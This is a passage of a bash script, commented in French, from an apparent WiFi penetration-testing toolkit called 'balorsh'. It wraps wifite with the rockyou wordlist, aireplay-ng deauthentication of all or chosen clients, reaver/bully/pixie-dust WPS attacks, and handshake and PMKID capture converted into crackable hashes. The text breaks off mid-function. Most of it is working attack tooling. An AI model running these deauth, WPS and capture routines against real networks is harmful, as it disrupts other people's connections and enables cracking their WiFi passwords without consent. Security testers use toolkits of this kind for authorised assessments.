#!/usr/bin/env bash
set -Eeuo pipefail

# stacks/wifi/commands.sh
# Menu WiFi complet pour balorsh

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
# shellcheck source=../../lib/common.sh
source "$ROOT_DIR/lib/common.sh"

# alias locaux pour la lisibilité
C_RESET="${C_RESET:-\033[0m}"
C_BOLD="${C_BOLD:-\033[1m}"
# palette: accent1/accent2/green/highlight
C_ACCENT1="${C_ACCENT1:-\033[38;2;117;30;233m}"
C_ACCENT2="${C_ACCENT2:-\033[38;2;144;117;226m}"
C_GOOD="${C_GOOD:-\033[38;2;6;251;6m}"
C_HIGHLIGHT="${C_HIGHLIGHT:-\033[38;2;37;253;157m}"
C_SHADOW="${C_SHADOW:-\033[38;2;128;128;128m}"
C_RED="\e[31m"
C_YELLOW="\e[33m"
C_INFO="\e[36m"

# Variables globales
IFACE_DEFAULT=""
IFACE=""

# Liste les interfaces WiFi disponibles
wifi_list_ifaces() {
  iw dev 2>/dev/null | awk '/Interface/ {print $2}' || true
}

# Affiche les interfaces WiFi détectées
wifi_show_ifaces() {
  clear
  echo -e "${C_ACCENT1}${WIFI_IFACES_DETECTED}${C_RESET}"
  local ifs
  ifs="$(wifi_list_ifaces)"
  if [[ -n "$ifs" ]]; then
    echo "$ifs"
    echo ""
    echo -e "${C_INFO}${WIFI_CHECK_CHIPSET_PROMPT}${C_RESET}"
    read -r check_chip
    if [[ "$check_chip" =~ ^[oO]$ ]]; then
      wifi_check_chipset
    fi
  else
    echo "$WIFI_IFACES_NONE"
  fi
}

# Demande à l'utilisateur de choisir une interface WiFi, avec valeur par défaut
wifi_select_iface() {
  local ifs
  ifs=($(wifi_list_ifaces))
  if (( ${#ifs[@]} == 0 )); then
    echo -e "${C_RED}${WIFI_NO_IFACE_DETECTED}${C_RESET}"
    return 1
  fi
  IFACE_DEFAULT="${ifs[0]}"
  echo -e "${C_ACCENT1}${WIFI_AVAILABLE_IFACES}${C_RESET} ${ifs[*]}"
  echo -ne "${WIFI_SELECT_IFACE} [${IFACE_DEFAULT}]: "
  read -r iface
  IFACE="${iface:-$IFACE_DEFAULT}"
  # Vérifie que l'interface choisie est valide
  if [[ ! " ${ifs[*]} " =~ " $IFACE " ]]; then
    echo -e "${C_RED}${WIFI_INVALID_IFACE}${C_RESET}"
    return 1
  fi
  return 0
}

# Vérifie si une interface est en mode monitor
wifi_check_monitor_mode() {
  local iface="$1"
  if command -v iw &>/dev/null; then
    # Utiliser iw pour vérifier le type
    local mode=$(iw dev "$iface" info 2>/dev/null | grep -w type | awk '{print $2}')
    [[ "$mode" == "monitor" ]]
  elif command -v iwconfig &>/dev/null; then
    # Fallback sur iwconfig
    iwconfig "$iface" 2>/dev/null | grep -q "Mode:Monitor"
  else
    # Si aucune commande disponible, on suppose que ce n'est pas en mode monitor
    return 1
  fi
}

# Vérifie le chipset de l'interface WiFi et affiche les recommandations
wifi_check_chipset() {
  clear
  local iface="${1:-$IFACE}"
  if [[ -z "$iface" ]]; then
    wifi_select_iface || return
    iface="$IFACE"
  fi
  
  echo -e "${C_ACCENT1}═══════════════════════════════════════════════════════════${C_RESET}"
  echo -e "${C_GOOD}Vérification du chipset pour: $iface${C_RESET}"
  echo -e "${C_ACCENT1}═══════════════════════════════════════════════════════════${C_RESET}"
  echo ""
  
  # Obtenir les informations du chipset
  local chipset_info=""
  local driver_info=""
  local vendor_id=""
  local device_id=""
  
  # Méthode 1: via ethtool pour obtenir le driver
  if command -v ethtool &>/dev/null; then
    driver_info=$(ethtool -i "$iface" 2>/dev/null | grep -E "^driver:" | awk '{print $2}')
  fi
  
  # Méthode 2: Lire directement depuis sysfs
  local sys_path="/sys/class/net/$iface/device"
  if [[ -e "$sys_path/vendor" ]]; then
    vendor_id=$(cat "$sys_path/vendor" 2>/dev/null || echo "")
    device_id=$(cat "$sys_path/device" 2>/dev/null || echo "")
  fi
  
  # Méthode 3: via lsusb pour interfaces USB
  local usb_info=""
  if command -v lsusb &>/dev/null; then
    # Trouver le périphérique USB associé à l'interface
    if [[ -e "$sys_path" ]]; then
      # Remonter dans l'arborescence USB pour trouver l'ID
      local dev_path=$(readlink -f "$sys_path")
      # Extraire l'ID USB du chemin (format: idVendor:idProduct)
      if [[ "$dev_path" =~ usb ]]; then
        local usb_id_vendor=$(cat "$sys_path/../idVendor" 2>/dev/null || echo "")
        local usb_id_product=$(cat "$sys_path/../idProduct" 2>/dev/null || echo "")
        if [[ -n "$usb_id_vendor" && -n "$usb_id_product" ]]; then
          usb_info=$(lsusb -d "${usb_id_vendor}:${usb_id_product}" 2>/dev/null || echo "")
        fi
      fi
    fi
  fi
  
  # Méthode 4: via lspci pour interfaces PCI (seulement pour cette interface)
  local pci_info=""
  if command -v lspci &>/dev/null && [[ -z "$usb_info" ]]; then
    # Obtenir l'adresse PCI de cette interface spécifique
    if [[ -e "$sys_path" ]]; then
      local pci_addr=$(basename $(readlink -f "$sys_path") 2>/dev/null || echo "")
      if [[ -n "$pci_addr" && "$pci_addr" =~ ^[0-9a-f]{4}:[0-9a-f]{2}:[0-9a-f]{2}\.[0-9]$ ]]; then
        pci_info=$(lspci -s "$pci_addr" 2>/dev/null || echo "")
      fi
    fi
  fi
  
  # Afficher les informations collectées
  echo -e "${C_HIGHLIGHT}${WIFI_CHIPSET_INFO_TITLE}${C_RESET}"
  echo -e "${WIFI_CHIPSET_INFO_INTERFACE} ${C_INFO}$iface${C_RESET}"
  [[ -n "$driver_info" ]] && echo -e "${WIFI_CHIPSET_INFO_DRIVER} ${C_INFO}$driver_info${C_RESET}"
  [[ -n "$usb_info" ]] && echo -e "${WIFI_CHIPSET_INFO_USB} ${C_INFO}$usb_info${C_RESET}"
  [[ -n "$pci_info" ]] && echo -e "${WIFI_CHIPSET_INFO_PCI} ${C_INFO}$pci_info${C_RESET}"
  echo ""
  
  # Analyser et afficher les recommandations depuis le fichier chipsets.md
  local chipsets_file="$ROOT_DIR/doc/wifi/chipsets_${LANG}.md"
  # Fallback to chipsets.md (English) if language-specific file doesn't exist
  [[ ! -f "$chipsets_file" ]] && chipsets_file="$ROOT_DIR/doc/wifi/chipsets.md"
  
  if [[ -f "$chipsets_file" ]]; then
    echo -e "${C_HIGHLIGHT}${WIFI_CHIPSET_RECOMMENDATIONS}${C_RESET}"
    echo ""
    
    # Détecter le chipset à partir du DRIVER principalement (plus fiable)
    local detected_chipset=""
    
    # Prioriser la détection par driver
    if echo "$driver_info" | grep -qi "ath9k\|ath9k_htc"; then
      detected_chipset="Atheros AR9271"
    elif echo "$driver_info" | grep -qi "rt2800usb\|rt3070\|rt3572"; then
      detected_chipset="Ralink RT3070/RT3572"
    elif echo "$driver_info" | grep -qi "rtl8812au\|8812au\|rtw.*8812"; then
      detected_chipset="Realtek RTL8812AU"
    elif echo "$driver_info" | grep -qi "rtl8814au\|8814au\|rtw.*8814"; then
      detected_chipset="Realtek RTL8814AU"
    elif echo "$driver_info" | grep -qi "rtl8187\|rtl8187b"; then
      detected_chipset="Realtek RTL8187"
    elif echo "$driver_info" | grep -qi "rtw88.*8822\|rtl8822\|8822bu"; then
      detected_chipset="Realtek RTL8822BU"
    elif echo "$driver_info" | grep -qi "rtw88.*8821\|rtl8821\|8821"; then
      detected_chipset="Realtek RTL8821"
    elif echo "$driver_info" | grep -qi "rtw88.*88\|rtl88"; then
      detected_chipset="Realtek RTL88xx"
    elif echo "$driver_info" | grep -qi "mt7610\|mt7612"; then
      detected_chipset="Mediatek MT7610U/MT7612U"
    elif echo "$driver_info" | grep -qi "brcm\|bcm43\|b43"; then
      detected_chipset="Broadcom BCM43xx"
    elif echo "$driver_info" | grep -qi "^iwl\|iwlwifi"; then
      detected_chipset="Intel Wireless"
    else
      # Fallback sur USB/PCI si le driver n'est pas reconnu
      local all_info="$usb_info $pci_info"
      if echo "$all_info" | grep -qi "atheros.*9271\|ar9271"; then
        detected_chipset="Atheros AR9271"
      elif echo "$all_info" | grep -qi "ralink.*3070\|rt3070\|rt3572"; then
        detected_chipset="Ralink RT3070/RT3572"
      elif echo "$all_info" | grep -qi "realtek.*8812"; then
        detected_chipset="Realtek RTL8812AU"
      elif echo "$all_info" | grep -qi "realtek.*8814"; then
        detected_chipset="Realtek RTL8814AU"
      elif echo "$all_info" | grep -qi "realtek.*8822"; then
        detected_chipset="Realtek RTL8822BU"
      elif echo "$all_info" | grep -qi "realtek.*8187"; then
        detected_chipset="Realtek RTL8187"
      elif echo "$all_info" | grep -qi "mediatek.*761"; then
        detected_chipset="Mediatek MT7610U/MT7612U"
      elif echo "$all_info" | grep -qi "broadcom"; then
        detected_chipset="Broadcom BCM43xx"
      elif echo "$all_info" | grep -qi "intel.*wireless"; then
        detected_chipset="Intel Wireless"
      fi
    fi
    
    if [[ -n "$detected_chipset" ]]; then
      printf "${C_GOOD}${WIFI_CHIPSET_DETECTED}${C_RESET}\n" "$detected_chipset"
      echo ""
      # Chercher la ligne correspondante dans le fichier
      local chipset_line
      chipset_line=$(grep -A 0 "$detected_chipset" "$chipsets_file" 2>/dev/null | head -n 1 || true)
      if [[ -n "$chipset_line" ]]; then
        echo "$chipset_line" | sed 's/^| /  /' | sed 's/ | / - /g' | sed 's/ |$//'
      else
        echo -e "${C_YELLOW}${WIFI_CHIPSET_NOT_IN_DATABASE:-Chipset non référencé dans la base de données}${C_RESET}"
      fi
      echo ""
    else
      echo -e "${C_YELLOW}${WIFI_CHIPSET_NOT_DETECTED}${C_RESET}"
      echo ""
    fi
    
    # Afficher le tableau complet
    printf "${C_SHADOW}${WIFI_CHIPSET_MORE_INFO}${C_RESET}\n" "$chipsets_file"
    echo ""
    echo -e "${C_INFO}${WIFI_CHIPSET_SUPPORTED_TABLE}${C_RESET}"
    grep -E "^\|.*\|" "$chipsets_file" 2>/dev/null | head -n 10 || true
  else
    printf "${C_YELLOW}${WIFI_CHIPSET_FILE_NOT_FOUND}${C_RESET}\n" "$chipsets_file"
  fi
  
  echo ""
}

# Active le mode monitor sur une interface
wifi_start_monitor_mode() {
  clear
  local iface="$1"
  printf "${C_HIGHLIGHT}${WIFI_ENABLE_MONITOR}${C_RESET}\n" "$iface"

  if command -v airmon-ng &>/dev/null; then
    sudo airmon-ng check kill
    sudo airmon-ng start "$iface"
    # airmon-ng peut renommer l'interface (wlan0 -> wlan0mon)
    local new_iface="${iface}mon"
    if ip link show "$new_iface" &>/dev/null; then
      iface="$new_iface"
    fi
  else
    sudo ip link set "$iface" down
    if command -v iw &>/dev/null; then
      sudo iw dev "$iface" set type monitor
    else
      sudo iwconfig "$iface" mode monitor
    fi
    sudo ip link set "$iface" up
  fi

  sleep 2
  # Vérifier si l'interface ou l'interface renommée est en mode monitor
  if wifi_check_monitor_mode "$iface"; then
    printf "${C_GOOD}${WIFI_MONITOR_ENABLED}${C_RESET}\n" "$iface"
    IFACE="$iface"
  elif wifi_check_monitor_mode "${1}mon"; then
    printf "${C_GOOD}${WIFI_MONITOR_ENABLED}${C_RESET}\n" "${1}mon"
    IFACE="${1}mon"
  else
    printf "${C_RED}${WIFI_MONITOR_FAILED}${C_RESET}\n" "$iface"
    printf "${C_YELLOW}Note: L'interface peut être en mode monitor malgré l'erreur. Vérifiez avec iwconfig.${C_RESET}\n"
  fi
}

# Désactive le mode monitor sur une interface
wifi_stop_monitor_mode() {
  local iface="$1"
  printf "${C_HIGHLIGHT}${WIFI_DISABLE_MONITOR}${C_RESET}\n" "$iface"

  if command -v airmon-ng &>/dev/null; then
    sudo airmon-ng stop "$iface"
  else
    sudo ip link set "$iface" down
    if command -v iw &>/dev/null; then
      sudo iw dev "$iface" set type managed
    else
      sudo iwconfig "$iface" mode managed
    fi
    sudo ip link set "$iface" up
  fi

  sleep 1
  if ! wifi_check_monitor_mode "$iface"; then
    printf "${C_GOOD}${WIFI_MONITOR_DISABLED}${C_RESET}\n" "$iface"
    IFACE="$iface"
    return 0
  else
    printf "${C_RED}${WIFI_MONITOR_DISABLE_FAILED}${C_RESET}\n" "$iface"
    return 1
  fi
}

# Détecte l'option d'output supportée par hcxdumptool sur ce système
hcxdumptool_output_flag() {
  if ! command -v hcxdumptool &>/dev/null; then
    return 1
  fi
  # Agrège le texte d'aide depuis les drapeaux d'aide communs
  local help
  # Collecte le texte d'aide mais considère uniquement les lignes qui ressemblent à des descriptions d'options
  local help
  help=$(hcxdumptool --help 2>&1 || true)
  help+=$("$(command -v hcxdumptool)" -h 2>&1 || true)
  # Ne correspond qu'aux lignes d'options (commencent par un espace optionnel puis - ou --)
  if printf '%s' "$help" | awk '/^[[:space:]]*-[-A-Za-z0-9, ]+/ {print}' | grep -q -E '(^|[[:space:]])-o\b'; then
    echo "-o"
    return 0
  elif printf '%s' "$help" | awk '/^[[:space:]]*-[-A-Za-z0-9, ]+/ {print}' | grep -q -- '--output\b'; then
    echo "--output"
    return 0
  elif printf '%s' "$help" | awk '/^[[:space:]]*-[-A-Za-z0-9, ]+/ {print}' | grep -q -E '(^|[[:space:]])-w\b'; then
    echo "-w"
    return 0
  elif printf '%s' "$help" | awk '/^[[:space:]]*-[-A-Za-z0-9, ]+/ {print}' | grep -q -E '(^|[[:space:]])-O\b'; then
    echo "-O"
    return 0
  else
    return 1
  fi
}

# Détecte quel drapeau de statut hcxdumptool supporte (le cas échéant)
hcxdumptool_status_flag() {
  if ! command -v hcxdumptool &>/dev/null; then
    return 1
  fi
  local help
  help=$(hcxdumptool --help 2>&1 || true)
  help+=$("$(command -v hcxdumptool)" -h 2>&1 || true)

  # Préfère la forme explicite avec = si montrée dans l'aide
  # Considère uniquement les lignes d'options pour réduire les faux positifs des exemples
  if printf '%s' "$help" | awk '/^[[:space:]]*-[-A-Za-z0-9, ]+/ {print}' | grep -q -- '--enable_status='; then
    echo "--enable_status=1"
    return 0
  elif printf '%s' "$help" | awk '/^[[:space:]]*-[-A-Za-z0-9, ]+/ {print}' | grep -q -- '--enable_status\b'; then
    echo "--enable_status"
    return 0
  elif printf '%s' "$help" | awk '/^[[:space:]]*-[-A-Za-z0-9, ]+/ {print}' | grep -q -- '--status\b'; then
    echo "--status"
    return 0
  else
    return 1
  fi
}

# Écrit un petit fichier de métadonnées à côté d'une sortie de hash créée contenant les MACs et le pcap source
write_hash_metadata() {
  local hashfile="$1";
  local pcapfile="$2";
  local raw_output="$3";
  if [[ -z "$hashfile" || -z "$pcapfile" ]]; then return 1; fi
  local metafile="${hashfile}.meta"
  {
    echo "source_pcapng: $pcapfile"
    echo "hash_file: $hashfile"
    echo "generated_at: $(date -Iseconds)"
    echo
    echo "hcxpcapngtool_summary:";
    # préfère les lignes explicites si présentes dans raw_output
    printf '%s\n' "$raw_output" | grep -E 'MAC ACCESS POINT|MAC CLIENT|REPLAYCOUNT|ANONCE|SNONCE' || true
    echo
    printf "$WIFI_NOTES_PMKID_INSPECT\n" "$pcapfile"
  } >"$metafile"
  echo -e "${C_INFO}Métadonnées enregistrées : $metafile${C_RESET}"
  return 0
}

# Change le canal wifi
wifi_set_channel() {
  local iface="$1"
  local channel="$2"
  if command -v iw &>/dev/null; then
    sudo iw dev "$iface" set channel "$channel"
  else
    sudo iwconfig "$iface" channel "$channel"
  fi
}

# Channel hopper (boucle sur canaux 1-11)
wifi_channel_hop() {
  clear
  local iface="$1"
  echo -e "${C_HIGHLIGHT}Channel hopping sur $iface (Ctrl+C pour arrêter)...${C_RESET}"
  
  # Trap pour gérer proprement Ctrl+C
  trap 'echo -e "\n${C_INFO}Channel hopping arrêté.${C_RESET}"; return 0' SIGINT SIGTERM
  
  while true; do
    for ch in {1..11}; do
      wifi_set_channel "$iface" "$ch" 2>/dev/null || true
      printf "\rCanal: %2d" "$ch"
      sleep 0.3
    done
  done
  
  # Réinitialiser le trap
  trap - SIGINT SIGTERM
}

# Scan wifi avec airodump-ng
wifi_airodump() {
  clear
  local iface="${1:-$IFACE}"
  if [[ -z "$iface" ]]; then
    wifi_select_iface || return
    iface="$IFACE"
  fi
  # Créer le répertoire de sortie
  : "${BALORSH_DATA_DIR:=/opt/balorsh/data}"
  local scan_dir="$BALORSH_DATA_DIR/wifi/scans"
  mkdir -p "$scan_dir"
  local outfile="$scan_dir/scan_$(date +%Y%m%d_%H%M%S)"
  echo -e "${C_HIGHLIGHT}Scan WiFi avec airodump-ng sur $iface...${C_RESET}"
  echo -e "${C_INFO}Fichiers sauvegardés dans: $scan_dir/${C_RESET}"
  sudo airodump-ng -w "$outfile" --output-format csv,pcap "$iface"
}

# Attaque automatique avec wifite
wifi_wifite() {
  clear
  : "${BALORSH_DATA_DIR:=/opt/balorsh/data}"
  local wifite_dir="$BALORSH_DATA_DIR/wifi/wifite"
  mkdir -p "$wifite_dir"
  cd "$wifite_dir" || { echo -e "${C_RED}Erreur: impossible de créer le répertoire${C_RESET}"; return; }
  echo -e "${C_HIGHLIGHT}$WIFI_WIFITE_LAUNCH...${C_RESET}"
  echo -e "${C_INFO}$WIFI_CAPTURES_SAVED_IN : $wifite_dir/hs/${C_RESET}"
  
  # Utilise rockyou.txt comme wordlist par défaut
  local wordlist="/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt"
  if [[ -f "$wordlist" ]]; then
    sudo wifite --kill --dict "$wordlist"
  else
    echo -e "${C_YELLOW}$WIFI_ROCKYOU_NOT_FOUND_USING_DEFAULT${C_RESET}"
    sudo wifite --kill
  fi
  
  cd - >/dev/null || true
}

# Reconnaissance avec bettercap
wifi_bettercap() {
  clear
  local iface="${1:-$IFACE}"
  if [[ -z "$iface" ]]; then
    wifi_select_iface || return
    iface="$IFACE"
  fi
  echo -e "${C_HIGHLIGHT}$WIFI_BETTERCAP_LAUNCH $iface...${C_RESET}"
  sudo bettercap -iface "$iface" -eval "set wifi.recon.channel_hop true; wifi.recon on; set ticker.commands 'wifi.show'; ticker on"
}

# Attaque deauth avec aireplay-ng
wifi_aireplay_deauth() {
  clear
  local iface="${1:-$IFACE}"
  local bssid client count
  wifi_select_iface || return
  iface="$IFACE"
  
  # Proposer un scan avant l'attaque
  echo -e "${C_HIGHLIGHT}Voulez-vous scanner les réseaux d'abord? (O/n)${C_RESET}"
  read -r do_scan
  do_scan="${do_scan:-o}"
  
  local tmpfile=""
  if [[ "$do_scan" =~ ^[oO]$ ]]; then
    echo -e "${C_INFO}Scan de 20 secondes pour détecter réseaux et clients...${C_RESET}"
    : "${BALORSH_DATA_DIR:=/opt/balorsh/data}"
    local scan_dir="$BALORSH_DATA_DIR/wifi/scans"
    mkdir -p "$scan_dir"
    tmpfile="$scan_dir/temp_scan_$(date +%Y%m%d_%H%M%S)"
    sudo timeout 20 airodump-ng -w "$tmpfile" --output-format csv "$iface" 2>/dev/null || true
    if [[ -f "${tmpfile}-01.csv" ]]; then
      echo -e "\n${C_GOOD}═══ Réseaux (Access Points) détectés ═══${C_RESET}"
      awk -F',' 'NR>2 && NF>13 && $1 ~ /^[0-9A-Fa-f:]+$/ && length($1)==17 {gsub(/^ +| +$/,"",$1); gsub(/^ +| +$/,"",$4); gsub(/^ +| +$/,"",$14); if($1 != "") printf "  BSSID: \033[36m%-17s\033[0m  CH: %-2s  ESSID: %s\n", $1, $4, $14}' "${tmpfile}-01.csv" | grep -v '^$' || echo "  ${C_YELLOW}Aucun réseau détecté${C_RESET}"
      
      echo -e "\n${C_GOOD}═══ Clients (Stations) détectés ═══${C_RESET}"
      # Les clients sont après la ligne vide dans le CSV
      awk -F',' 'BEGIN{clients=0} /^Station MAC/ {clients=1; next} clients==1 && NF>5 && $1 ~ /^[0-9A-Fa-f:]+$/ && length($1)==17 {gsub(/^ +| +$/,"",$1); gsub(/^ +| +$/,"",$6); if($1 != "" && $6 != "") printf "  Client: \033[36m%-17s\033[0m  → AP: %s\n", $1, $6}' "${tmpfile}-01.csv" | grep -v '^$' || echo "  ${C_YELLOW}Aucun client détecté (peut nécessiter plus de temps)${C_RESET}"
      echo ""
      
      echo -e "${C_SHADOW}Astuce: Notez le BSSID de l'AP cible et éventuellement le MAC d'un client connecté${C_RESET}"
      echo ""
    fi
  fi
  
  echo -ne "$WIFI_PROMPT_BSSID_TARGET"
  read -r bssid
  
  # Extraire le canal du BSSID depuis le scan
  local channel=""
  if [[ -n "$tmpfile" && -f "${tmpfile}-01.csv" ]]; then
    channel=$(awk -F',' -v target="$bssid" 'NR>2 && NF>13 && $1 ~ /^[0-9A-Fa-f:]+$/ {gsub(/^ +| +$/,"",$1); gsub(/^ +| +$/,"",$4); if(tolower($1) == tolower(target)) print $4}' "${tmpfile}-01.csv" | head -n1)
    
    echo -e "\n${C_INFO}Clients détectés pour ce BSSID:${C_RESET}"
    awk -F',' -v target="$bssid" 'BEGIN{clients=0} /^Station MAC/ {clients=1; next} clients==1 && NF>5 && $1 ~ /^[0-9A-Fa-f:]+$/ {gsub(/^ +| +$/,"",$1); gsub(/^ +| +$/,"",$6); if($6 == target) printf "  %s\n", $1}' "${tmpfile}-01.csv" | grep -v '^$' || echo "  ${C_YELLOW}Aucun client spécifique détecté pour ce BSSID${C_RESET}"
    echo ""
  fi
  
  # Demander le canal si non trouvé dans le scan
  if [[ -z "$channel" ]]; then
    echo -ne "$WIFI_PROMPT_CHANNEL"
    read -r channel
  else
    echo -e "${C_INFO}Canal détecté: ${C_HIGHLIGHT}$channel${C_RESET}"
    echo -ne "Confirmer le canal [$channel]: "
    read -r channel_input
    channel="${channel_input:-$channel}"
  fi
  
  echo -ne "${C_HIGHLIGHT}$WIFI_PROMPT_CLIENT_MAC (appuyez sur Entrée pour attaquer tous les clients)${C_RESET}: "
  read -r client
  
  echo -ne "$WIFI_PROMPT_DEAUTH_COUNT"
  read -r count
  count="${count:-10}"
  
  # Changer l'interface sur le bon canal
  echo -e "${C_INFO}Configuration de l'interface sur le canal $channel...${C_RESET}"
  sudo iw dev "$iface" set channel "$channel" 2>/dev/null || {
    echo -e "${C_YELLOW}Impossible de changer le canal avec iw, tentative avec iwconfig...${C_RESET}"
    sudo iwconfig "$iface" channel "$channel" 2>/dev/null || {
      echo -e "${C_RED}Erreur: impossible de changer le canal${C_RESET}"
    }
  }
  
  echo -e "${C_HIGHLIGHT}$WIFI_DEAUTH_LAUNCH...${C_RESET}"
  
  # Si client vide ou 'all', ne pas utiliser -c (broadcast deauth)
  if [[ -z "$client" || "$client" == "all" || "$client" == "ALL" ]]; then
    echo -e "${C_INFO}Mode broadcast: déconnexion de tous les clients de $bssid${C_RESET}"
    sudo aireplay-ng --deauth "$count" -a "$bssid" "$iface" || {
      echo -e "${C_RED}Erreur lors de l'attaque deauth${C_RESET}"
      echo -e "${C_YELLOW}Vérifiez que l'interface est en mode monitor et sur le bon canal${C_RESET}"
    }
  else
    echo -e "${C_INFO}Mode ciblé: déconnexion du client $client de $bssid${C_RESET}"
    sudo aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$iface" || {
      echo -e "${C_RED}Erreur lors de l'attaque deauth${C_RESET}"
      echo -e "${C_YELLOW}Vérifiez que l'interface est en mode monitor et sur le bon canal${C_RESET}"
    }
  fi
}

# Attaque WPS (reaver, bully, pixie dust)
wifi_wps_attack() {
  wifi_select_iface || return 1
  local iface="$IFACE"
  echo -ne "$WIFI_PROMPT_BSSID_TARGET"
  read -r bssid
  echo -ne "$WIFI_PROMPT_CHANNEL"
  read -r channel
  echo -e "1) Reaver\n2) Bully\n3) Pixie Dust"
  echo -ne "$WIFI_PROMPT_CHOICE_DEFAULT [1]: "
  read -r choice
  choice="${choice:-1}"
  case "$choice" in
    1) sudo reaver -i "$iface" -b "$bssid" -c "$channel" -vv ;;
    2) sudo bully -b "$bssid" -c "$channel" "$iface" ;;
    3) sudo reaver -i "$iface" -b "$bssid" -c "$channel" -K 1 -vv ;;
    *) echo "$WIFI_CHOICE_INVALID" ;;
  esac
}

# Capture handshake
wifi_capture_handshake() {
  clear
  wifi_select_iface || return
  local iface="$IFACE"
  
  # Proposer un scan avant la capture
  echo -e "${C_HIGHLIGHT}Voulez-vous scanner les réseaux d'abord? (o/N)${C_RESET}"
  read -r do_scan
  if [[ "$do_scan" =~ ^[oO]$ ]]; then
    echo -e "${C_INFO}Scan de 10 secondes...${C_RESET}"
    : "${BALORSH_DATA_DIR:=/opt/balorsh/data}"
    local scan_dir="$BALORSH_DATA_DIR/wifi/scans"
    mkdir -p "$scan_dir"
    local tmpfile="$scan_dir/temp_scan_$(date +%Y%m%d_%H%M%S)"
    sudo timeout 10 airodump-ng -w "$tmpfile" --output-format csv "$iface" 2>/dev/null || true
    if [[ -f "${tmpfile}-01.csv" ]]; then
      echo -e "\n${C_GOOD}Réseaux détectés:${C_RESET}"
      awk -F',' 'NR>2 && $1 ~ /:/ {gsub(/^ +| +$/,"",$1); gsub(/^ +| +$/,"",$4); gsub(/^ +| +$/,"",$14); printf "BSSID: %-17s  CH: %-2s  ESSID: %s\n", $1, $4, $14}' "${tmpfile}-01.csv" | grep -v '^$'
      echo ""
    fi
  fi
  
  echo -ne "$WIFI_PROMPT_BSSID_TARGET"
  read -r bssid
  echo -ne "$WIFI_PROMPT_CHANNEL"
  read -r channel

  # Crée un sous-dossier captures wifi si besoin
  : "${BALORSH_DATA_DIR:=/opt/balorsh/data}"
  local capture_dir="$BALORSH_DATA_DIR/wifi/captures"
  mkdir -p "$capture_dir"

  local outfile="$capture_dir/handshake_$(date +%Y%m%d_%H%M%S)"
  echo -e "${C_HIGHLIGHT}$(printf "$WIFI_CAPTURE_HANDSHAKE_ON" "$bssid")${C_RESET}"
  sudo airodump-ng --bssid "$bssid" -c "$channel" -w "$outfile" "$iface"
  echo "$WIFI_FILES_CAPTURED"
  printf "$WIFI_FILE_MAIN_CAPTURE\n" "${outfile}-01.cap"
  printf "$WIFI_FILE_CSV\n" "${outfile}-01.csv"
  printf "$WIFI_FILE_KISMET_CSV\n" "${outfile}-01.kismet.csv"
  printf "$WIFI_FILE_KISMET_XML\n" "${outfile}-01.kismet.netxml"
}

# ----- Gestion de session -----
wifi_start_session() {
  clear
  : "${BALORSH_DATA_DIR:=/opt/balorsh/data}"
  local ts
  ts="$(date +%Y%m%d_%H%M%S)"
  WIFI_SESSION_DIR="$BALORSH_DATA_DIR/wifi/sessions/$ts"
  mkdir -p "$WIFI_SESSION_DIR"
  printf "$WIFI_SESSION_STARTED\n" "$WIFI_SESSION_DIR"
  echo "start_time=$(date -Iseconds)" >"$WIFI_SESSION_DIR/session.meta"
}

wifi_end_session() {
  if [[ -n "$WIFI_SESSION_DIR" && -d "$WIFI_SESSION_DIR" ]]; then
    echo "end_time=$(date -Iseconds)" >>"$WIFI_SESSION_DIR/session.meta"
    printf "$WIFI_SESSION_ENDED\n" "$WIFI_SESSION_DIR"
    unset WIFI_SESSION_DIR
  else
    echo "$WIFI_SESSION_NONE_ACTIVE"
  fi
}

# ----- Aide auto handshake / capture -----
wifi_auto_handshake() {
  clear
  local iface="${1:-$IFACE}"
  if [[ -z "$iface" ]]; then
    wifi_select_iface || return
    iface="$IFACE"
  fi
  : "${BALORSH_DATA_DIR:=/opt/balorsh/data}"
  mkdir -p "$BALORSH_DATA_DIR/wifi/captures"
  local outfile="$BALORSH_DATA_DIR/wifi/captures/auto_$(date +%Y%m%d_%H%M%S)"

  echo -e "${C_HIGHLIGHT}Auto-capture handshake sur $iface...${C_RESET}"

  # Préfère hcxdumptool pour la capture PMKID/EAPOL si disponible
  if command -v hcxdumptool &>/dev/null; then
    echo -e "${C_INFO}Utilisation de hcxdumptool pour la capture PMKID/EAPOL (Ctrl+C pour arrêter)${C_RESET}"
    oflag=$(hcxdumptool_output_flag || true)
    sflag=$(hcxdumptool_status_flag || true)
    if [[ -n "$oflag" ]]; then
      # construit la commande dynamiquement pour inclure le drapeau de statut seulement si supporté
      if [[ -n "$sflag" ]]; then
        sudo hcxdumptool -i "$iface" "$sflag" "$oflag" "${outfile}.pcapng" || true
      else
        sudo hcxdumptool -i "$iface" "$oflag" "${outfile}.pcapng" || true
      fi

      echo -e "${C_GOOD}$WIFI_CAPTURE_FILE_GENERATED : ${outfile}.pcapng${C_RESET}"
      # Tente la conversion et les métadonnées après la fin de la capture
      if command -v hcxpcapngtool &>/dev/null; then
        local conv_out
        conv_out=$(sudo hcxpcapngtool -o "${outfile}.hc22000" "${outfile}.pcapng" 2>&1 || true)
        if [[ -f "${outfile}.hc22000" ]]; then
          echo -e "${C_GOOD}$(printf "$WIFI_FILE_HASH_CREATED" "${outfile}.hc22000")${C_RESET}"
          write_hash_metadata "${outfile}.hc22000" "${outfile}.pcapng" "$conv_out" || true
        else
          echo -e "${C_RED}Conversion échouée${C_RESET}"
          printf '%s\n' "$conv_out"
        fi
      else
        echo "$WIFI_HCXDUMPTOOL_MISSING";
      fi
      return 0
    else
      echo -e "${C_RED}$WIFI_HCXDUMPTOOL_FALLBACK${C_RESET}"
      # repli sur la capture airodump-ng
      sudo airodump-ng -w "$outfile" --write-interval 1 --output-format pcap,csv,netxml "$iface"
      printf "$WIFI_FILE_CREATED\n" "${outfile}-01.cap / ${outfile}-01.csv"
      return 0
    fi
  fi

  # Repli sur la capture airodump-ng (mode monitor requis)
  echo "$WIFI_HCXDUMPTOOL_MISSING"
  sudo airodump-ng -w "$outfile" --write-interval 1 --output-format pcap,csv,netxml "$iface"
  printf "$WIFI_FILE_CREATED\n" "${outfile}-01.cap / ${outfile}-01.csv"
}

# ----- Capture PMKID + conversion -----
wifi_capture_pmkid() {
  clear
  local iface="${1:-$IFACE}"
  if [[ -z "$iface" ]]; then wifi_select_iface || return; iface="$IFACE"; fi
  : "${BALORSH_DATA_DIR:=/opt/balorsh/data}"
  mkdir -p "$BALORSH_DATA_DIR/wifi/captures"
